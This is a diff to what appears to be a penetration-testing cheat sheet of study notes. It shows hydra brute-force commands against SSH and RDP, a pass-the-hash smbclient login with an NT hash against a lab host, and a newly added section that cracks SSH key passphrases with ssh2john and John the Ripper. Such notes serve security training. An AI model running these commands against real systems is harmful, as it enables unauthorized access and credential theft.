@@ -1330,12 +1330,16 @@ hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<IP>
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
 ```
 
-
 ##### Pass-the-Hash to SMB share
 ```bash
 smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 ```
 
+##### Cracking ssh key passcodes
+```bash
+ssh2john id_rsa > ssh.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+```
 
 # Port Forwarding & SSH Tunneling
 ## nc
